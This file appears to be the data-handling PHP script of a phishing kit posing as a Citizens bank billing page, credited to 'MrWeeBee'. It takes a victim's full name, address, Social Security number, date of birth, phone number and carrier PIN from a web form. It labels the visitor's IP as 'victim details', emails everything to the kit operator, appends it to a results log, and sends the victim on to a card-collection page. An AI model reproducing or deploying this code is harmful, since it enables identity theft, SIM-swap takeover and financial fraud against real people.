<?php
$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}


# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$first_name = $_POST['fname'];
$address = $_POST['address'];
$city = $_POST['city'];
$zipcode = $_POST['zip'];
$state = $_POST['state'];
$country = $settings['country'];
$number = $_POST['phone'];
$carrier_pin = $_POST['cpin'];
$ssn = $_POST['ssn'];
$dob = $_POST['dob'];




# Messsage

$message = "[ 💚 CITIZEN  | CLIENT : {$client} 💚 ]\n\n";
$message .= "********** [ ADDRESS INFORMATION ] **********\n";
$message .= "# FULLNAME    : {$first_name}\n";
$message .= "# ADDRESS     : {$address}\n";
$message .= "# ZIPCODE     : {$zipcode}\n";
$message .= "# SSN         : {$ssn}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "# NUMBER      : +1{$number}\n";
$message .= "# CARRIER PIN : {$carrier_pin}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: MrWeeBee <citizen@client_{$client}_site.com>" . "\r\n";
    $subject = "🔰MRWEEBEE🔰CITIZEN🔰BILLING🔰CLIENT #{$client}🔰{$IP}";
    $msg = strtoupper($message);
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results, strtoupper($message));
    fclose($results);
}



echo "<script>window.location.href =\"../card\"; </script>";

?>
